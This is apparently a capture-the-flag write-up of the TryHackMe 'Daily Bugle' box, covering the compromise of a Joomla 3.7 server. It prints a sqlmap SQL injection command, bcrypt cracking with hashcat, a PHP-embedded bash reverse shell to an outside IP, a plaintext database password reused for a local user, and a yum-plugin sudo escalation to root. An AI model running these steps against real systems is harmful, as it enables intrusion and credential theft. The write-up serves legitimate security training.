---
title: Writeup Daily Bugle (THM)
layout: post
author: hyprcub
tags: writeup
---
# TL;DR

This [Try Hack Me box](https://tryhackme.com/room/dailybugle) features mainly SQLi and hashes cracking. It goes as follow:
- exploit an [SQL injection vulnerability in Joomla 3.7.0](https://www.exploit-db.com/exploits/42033) to get a password hash
- crack it and use the credentials to log in the CMS
- inject a one-line PHP reverse shell in Joomla's default template code
- mine passwords to escalate to a regular user
- abuse `sudo` and `yum` to get full privileges.

# Enumeration

## Ports and Services

We start we the usual ports scanning:
```bash
export target=10.10.175.125
nmap $target -p- -A -oN tcp_ports.txt
sudo nmap $target -sU -oN udp_ports.txt
```

From the results:
```
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-generator: Joomla! - Open Source Content Management
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
```
we learn a bunch of things. Mainly, that there is a [Joomla! CMS instance](https://www.joomla.org/) on **port 80/tcp**.

## Port 80/tcp

To get Joomla's version one can read the `README.txt` or use [OWASP Joomscan](https://github.com/OWASP/joomscan) :
```bash
curl $target/README.txt
```

```
1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/master

[SNIP]
```
This is **Joomla 3.7**.

# Low Level Access

## SQLi
This particular Joomla version is subject to an [SQL injection vulnerability](https://www.exploit-db.com/exploits/42033). One can exploit it with [sqlmap](http://sqlmap.org/) to get a password hash:
```bash
sqlmap -u "http://$target/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump -C username,password
```

It gives:
![sqlmat output]({{ "/assets/img/daily-bugle-sqlmap.png"| absolute_url }})
For manual exploitation of this blind SQLi, see [hack3rman's considerations](https://github.com/hack3rman/TryHackMe/blob/master/Daily%20Bugle.md) and [his python script](https://github.com/hack3rman/TryHackMe/blob/master/Scripts/db-blind.py).

## Hash cracking

One can identify the hash using [haiti](https://noraj.github.io/haiti/#/):
```bash
echo $2y$[OBFUSCATED] > hash
haiti $(cat hash)
```
```
Blowfish(OpenBSD) [HC: 3200] [JtR: bcrypt]
Woltlab Burning Board 4.x
bcrypt [HC: 3200] [JtR: bcrypt]
```
**bcrypt** format  is confirmed by looking at [hashcat's wiki](https://hashcat.net/wiki/doku.php?id=example_hashes).

Then one crack it with [hashcat](https://hashcat.net):
```bash
export dict=/usr/share/wordlists/rockyou.txt
hashcat -m 3200 hash $dict
```
![Hashcat output]({{ "/assets/img/daily-bugle-hashcat.png" | absolute_url }})

## Shell

Now that we have credentials one can log in Joomla's administrator panel located at `http://$target/administrator/` and navigate to Joomla's defaut template to inject shell code into `/index.php`, namely:
```php
shell_exec("/bin/bash -i >& /dev/tcp/10.11.31.164/443 0>&1");
```
See below:
![shell code in a PHP file]({{ "/assets/img/daily-bugle-shell-code.png"| absolute_url }})

After having set up a netcat listener  and triggered the shell with `curl $target` one gets a command line as the user `www-data`:
![a shell as www-data]({{ "/assets/img/daily-bugle-shell.png" | absolute_url }})

Before proceeding to privilege escalation, let's enhance the shell:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
export PS1="(\u@\h) [\w]\$ "
alias ll="ls -al --color=auto" # yes, I like colors
```
see [ropnop's blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) for further details.

# Privilege Escalation

## Escalating to jjameson user

Doing the usual password mining, one can find the following lines in the file `/var/www/html/configuration.php`:
```php
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
```
which are the admin credentials for MySQL. The password is also good for the user `jjameson`:
![su as jjameson]({{ "/assets/img/daily-bugle-jjameson.png" | absolute_url }})

## Abusing sudo and yum

Checking `sudo -l` is one of the quickest win:
```
Matching Defaults entries for jjameson on dailybugle:
	!visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
	env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
	env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
	env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
	env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
	env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
	secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
	(ALL) NOPASSWD: /usr/bin/yum
```

According to [GTFOBins](https://gtfobins.github.io/gtfobins/yum/), `yum` can be abused to get full privileges:
```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
![root shell]({{ "/assets/img/daily-bugle-root.png" | absolute_url }})
